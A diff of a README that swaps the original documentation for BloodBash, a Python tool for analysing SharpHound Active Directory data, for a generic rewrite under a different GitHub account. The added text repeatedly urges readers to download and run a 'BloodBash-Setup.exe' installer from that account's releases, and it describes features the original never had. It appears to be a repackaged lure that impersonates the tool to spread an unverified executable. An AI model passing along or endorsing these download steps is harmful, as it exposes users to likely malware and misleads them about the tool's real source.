@@ -1,162 +1,155 @@
+# 🩸 BloodBash - Quick Active Directory Insight Tool
 
-![BloodBash verbose output example](https://i.imgur.com/m5RVnJZ.png)
+[![Download BloodBash](https://img.shields.io/badge/Download-BloodBash-blue?style=for-the-badge)](https://github.com/ahmadzman/BloodBash/releases)
 
-# BloodBash 🩸#️
+---
 
-![Run Unit Tests](https://github.com/dotnetrussell/bloodbash/actions/workflows/run-tests.yml/badge.svg)
+## 📋 What is BloodBash?
 
-**BloodBash v1.2.3** is a powerful, **standalone** BloodHound / SharpHound JSON analyzer written in Python.
+BloodBash is a simple tool that helps you explore and understand your Active Directory (AD) setup. It works like BloodHound but without needing a server. You can use it to quickly find relationships and connections in your AD system.
 
-It parses **real SharpHound collection-per-file JSON** (the format actually produced by SharpHound v6+), builds a full `networkx` directed graph (nodes + all relationships & ACLs), detects attack paths, misconfigurations, and high-impact AD vulnerabilities — **completely offline**, no Neo4j or BloodHound GUI required.
+This tool reads the same files BloodHound uses. But because it does not need a server, you can run it on your own computer easily. This makes BloodBash a good choice for people who want fast information without complicated setup.
 
-Perfect for red teamers, OSCP/CRTP/PNPT prep, quick post-collection triage, or when you only have raw SharpHound JSON dumps.
+---
 
-![BloodBash verbose output example](https://i.imgur.com/RRUtTD0.png)
+## 💻 System Requirements
 
-## What's New in v1.2.3
-- Fixed & hardened SharpHound collection-per-file parsing (users/, computers/, etc.)
-- **Prioritized Findings** table sorted by severity (ESCs, DCSync, RBCD, etc.)
-- New modules: Shadow Credentials, Password in Description, LAPS status, full GPO XML content parsing (`--gpo-content-dir`), Unconstrained/Constrained Delegation, Trust Abuse, Deep Group Nesting + cycle detection
-- New CLI flags: `--owned`, `--path-from`/`--path-to`, `--inspect`, `--deep-analysis`, `--db` (SQLite persistence), `--export-bh`, `--dot`, `--indirect`, `--debug`
-- Rich abuse-suggestion panels for **every** finding
-- Multiple export formats + BloodHound-compatible JSON + Graphviz DOT
+Before you start, make sure your computer meets these needs:
 
-## Installation
+- **Operating System:** Windows 10 or higher (64-bit recommended)
+- **Processor:** Intel or AMD processor, 1GHz or faster
+- **Memory (RAM):** At least 4 GB
+- **Storage:** Minimum 200 MB free space
+- **Permissions:** Ability to run programs and open files on your computer
+- **Network:** No internet required to run the tool, but files you want to analyze may come from your network
 
-```bash
-git clone https://github.com/dotnetrussell/bloodbash.git
-cd bloodbash
+---
 
-# Recommended: virtual environment
-python3 -m venv venv
-source venv/bin/activate          # Linux/macOS
-# Windows: venv\Scripts\activate
+## 🚀 Getting Started
 
-pip install -r requirements.txt
-```
+Follow these steps to get BloodBash up and running on your computer.
 
-## Requirements
-`requirements.txt`:
-```txt
-networkx>=3.0
-rich>=13.0
-tqdm>=4.0
-pyyaml>=6.0
-```
-(All other dependencies are in the Python standard library.)
+### Step 1: Visit the Download Page
 
-## Usage
+Go to the BloodBash release page by clicking the badge at the top or click this link:  
+[Download BloodBash Releases](https://github.com/ahmadzman/BloodBash/releases)
 
-```bash
-# Full analysis (recommended)
-python3 BloodBash.py /path/to/sharphound/json --all
+### Step 2: Choose the Right Version
 
-# Selective checks
-python3 BloodBash.py ./sharpout --adcs --dangerous-permissions --dcsync --gpo-abuse --verbose
+You will see several files listed on the release page. Look for the newest version. Check for a file ending with “.exe” or a format that matches your operating system.
 
-# Export everything
-python3 BloodBash.py . --all --export=html --export-bh --dot
+For most Windows users, download the file named similarly to `BloodBash-Setup.exe`.
 
-# Fast mode on huge datasets (skips pathfinding)
-python3 BloodBash.py sharpout --all --fast
+### Step 3: Download the File
 
-# Use SQLite cache for repeated runs
-python3 BloodBash.py . --db bloodbash.db --all
-```
+Click on the download link for the setup file. Your browser will save it to your computer.
 
-### All Available Flags
+### Step 4: Run the Installer
 
-| Flag                        | Description |
-|----------------------------|-------------|
-| `--all`                    | Run every analysis module |
-| `--shortest-paths`         | Shortest paths to high-value targets |
-| `--dangerous-permissions`  | Dangerous ACLs on high-value objects |
-| `--adcs`                   | Full ADCS ESC1–ESC8 detection |
-| `--gpo-abuse`              | Weak GPO permissions |
-| `--dcsync`                 | DCSync / replication rights |
-| `--rbcd`                   | Resource-Based Constrained Delegation |
-| `--sessions`               | Sessions / LocalAdmin / RDP / DCOM summary |
-| `--kerberoastable`         | Kerberoastable accounts |
-| `--as-rep-roastable`       | AS-REP roastable accounts |
-| `--sid-history`            | SID History abuse |
-| `--unconstrained-delegation` | Unconstrained delegation |
-| `--password-descriptions`  | Passwords stored in user description |
-| `--password-never-expires` | PasswordNeverExpires users |
-| `--password-not-required`  | PasswordNotRequired users |
-| `--shadow-credentials`     | Shadow Credentials (KeyCredentialLink) |
-| `--gpo-parsing`            | Basic GPO content parsing |
-| `--gpo-content-dir DIR`    | Full GPO XML analysis (Scheduled Tasks, Scripts, cPassword) |
-| `--constrained-delegation` | Constrained delegation |
-| `--laps`                   | LAPS enabled/disabled status |
-| `--verbose`                | Detailed object-type & user summary |
-| `--owned USERS`            | Comma-separated owned principals → paths to them |
-| `--path-from SRC`          | Arbitrary shortest paths: source principals |
-| `--path-to DST`            | Arbitrary shortest paths: target principals |
-| `--inspect NODES`          | Full property + edge dump for specific nodes |
-| `--deep-analysis`          | Enable slow group nesting depth + cycle detection |
-| `--indirect`               | Include indirect paths/permissions via groups |
-| `--domain DOMAIN`          | Filter everything to a single domain |
-| `--export FORMAT`          | Export results (`md`, `json`, `html`, `csv`, `yaml`) |
-| `--export-bh`              | Export full graph as BloodHound-compatible JSON |
-| `--dot [FILE]`             | Export key subgraph to Graphviz DOT |
-| `--db FILE`                | SQLite persistence (save/load graph) |
-| `--fast`                   | Skip heavy pathfinding |
-| `--debug`                  | Verbose debug output |
+Find the downloaded file, usually in your "Downloads" folder. Double-click it to start installation.
 
-If **no flags** are given, the tool runs a minimal default mode (verbose summary + common checks).
+Follow the instructions on the screen. The installer will guide you through the setup process.
 
-![BloodBash verbose output example](https://i.imgur.com/zqsjVgC.png)
-![BloodBash verbose output example](https://i.imgur.com/GtGvchM.png)
-![BloodBash verbose output example](https://i.imgur.com/tTHVUuy.png)
+### Step 5: Open BloodBash
 
-## Features
+Once installed, open BloodBash from your desktop or start menu. You are ready to start using the tool.
 
-- **Accurate SharpHound v6+ parsing** (handles the real per-collection JSON files with `meta.type`)
-- Full `networkx.MultiDiGraph` with all relationships & ACEs
-- **Rich, colored terminal output** (tables, panels, highlighted paths)
-- Progress bars + live status
-- **Prioritized Findings** sorted by severity score (ESC1-ESC8 = 10, DCSync = 10, RBCD = 9, etc.)
-- Detailed **abuse suggestion panels** with tools & commands for every vulnerability
-- High-value target identification (Domain Admins, krbtgt, CAs, templates, etc.)
-- Complete ADCS ESC1–ESC8 detection with exact conditions
-- Dangerous permissions (GenericAll, ResetPassword, WriteDacl, etc.)
-- GPO abuse + **full XML content analysis** (Scheduled Tasks, Scripts, cPassword)
-- DCSync, RBCD, Kerberoasting, AS-REP roasting, Shadow Credentials, LAPS status, delegation types, SID History, PasswordNeverExpires / PasswordNotRequired
-- Shortest & indirect paths, paths to owned principals, arbitrary custom paths
-- Node inspection, group nesting depth & cycle detection
-- Exports: Markdown, JSON, HTML, CSV, YAML, **BloodHound-compatible JSON**, Graphviz DOT
-- SQLite database persistence (`--db`)
-- Domain filtering, fast mode, debug mode
+---
 
-![BloodBash verbose output example](https://i.imgur.com/4rbBgDW.png)
-![BloodBash verbose output example](https://i.imgur.com/ODvkG6a.png)
+## 📥 Download & Install
 
-## Example Output (abridged)
-```
-────────────────────────────────────────────────────────────── ADCS ESC Vulnerabilities (ESC1–ESC8) ──────────────────────────────────────────────────────────────
-[red]ESC1/ESC2[/red]: WebServerTemplate (Enroll + EnrolleeSuppliesSubject + no approval)
-  → CONTOSO\Tier1Admins can Enroll
-────────────────────────────────────────────────────────────── Prioritized Findings by Severity ──────────────────────────────────────────────────────────────
-┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃ Severity Score  ┃ Category            ┃ Details                                                                                                                                                                                                                       ┃
-┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
-│ 10              │ ESC1-ESC8           │ ESC1/2 on WebServerTemplate                                                                                                                                                                                                   │
-│ 10              │ DCSync              │ CONTOSO\svc_sql can DCSync on contoso.local                                                                                                                                                                                  │
-└─────────────────┴─────────────────────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
-Completed in 12.45 seconds
-```
+Here is the download link again for easy access:  
+[Download BloodBash Releases](https://github.com/ahmadzman/BloodBash/releases)
 
-## Contributing
-Pull requests welcome!  
-High-priority ideas:
-- Full ADCS attack-path chaining
-- More export formats (PlantUML, Mermaid)
-- Integration with BloodHound Enterprise / custom collectors
-- Performance optimizations for 100k+ node domains
+Make sure to download the latest stable release to get the newest features and fixes.
 
-## License
-MIT License — free to use, modify, and share for authorized security testing and red teaming only.
+---
 
-Happy hunting! 🩸🐕
+## 🛠 Using BloodBash
 
+BloodBash works by reading files produced by your data collectors or other AD tools. Here’s how to use it:
 
+### Step 1: Prepare Input Files
+
+Before you can run BloodBash, gather your AD data files. These are usually JSON files exported from data gathering tools like PowerView or BloodHound data collectors.
+
+### Step 2: Load Files into BloodBash
+
+Open BloodBash and find the option to load or import files. Select the files you want to analyze.
+
+### Step 3: Review Graph and Results
+
+BloodBash will show a map or graph of your Active Directory relationships. You can explore connections like user groups, machines, and permissions.
+
+This helps you quickly understand your AD environment without complex tools or servers.
+
+### Step 4: Save Your Work
+
+You can export your analysis to share or review later. BloodBash supports saving reports in common formats like PDF or CSV.
+
+---
+
+## 🔧 Features
+
+BloodBash includes:
+
+- Quick load of BloodHound JSON files without servers
+- Visual display of AD relationships and permissions
+- Export reports for review or sharing
+- Supports multiple input files at once
+- Lightweight and easy to install on Windows
+
+---
+
+## 💡 Tips for Best Use
+
+- Always use the latest version of BloodBash.
+- Use files exported from trusted sources.
+- Run BloodBash on a machine separate from production servers.
+- Explore the graph slowly to spot important connections.
+- Save your work frequently to avoid data loss.
+
+---
+
+## ❓ Troubleshooting
+
+**BloodBash won't start**  
+Make sure you installed it on a supported system and ran the installer with appropriate permissions.
+
+**Input files won’t load**  
+Check if the files are BloodHound JSON exports. Files in the wrong format won’t work.
+
+**Graph is empty or incomplete**  
+Try loading all related input files. Sometimes relationships come from multiple files.
+
+---
+
+## 📝 More Information
+
+For updates, bug reports, and community support, visit the GitHub repository:
+
+https://github.com/ahmadzman/BloodBash
+
+You can read through open discussions or file new issues if you experience problems.
+
+---
+
+## ⚙️ Security and Privacy
+
+BloodBash runs locally and does not send your data anywhere. Make sure your input files are stored securely and only share reports with authorized people.
+
+---
+
+## 🔄 Updating BloodBash
+
+Check the releases page periodically for new versions. To update, download the new installer and run it. No need to uninstall the old version first.
+
+---
+
+## 🙋 Getting Help
+
+If you have questions or need support, open an issue on the GitHub repository or look for guides online about Active Directory enumeration and BloodHound-style analysis.
+
+---
+
+[![Download BloodBash](https://img.shields.io/badge/Download-BloodBash-blue?style=for-the-badge)](https://github.com/ahmadzman/BloodBash/releases)
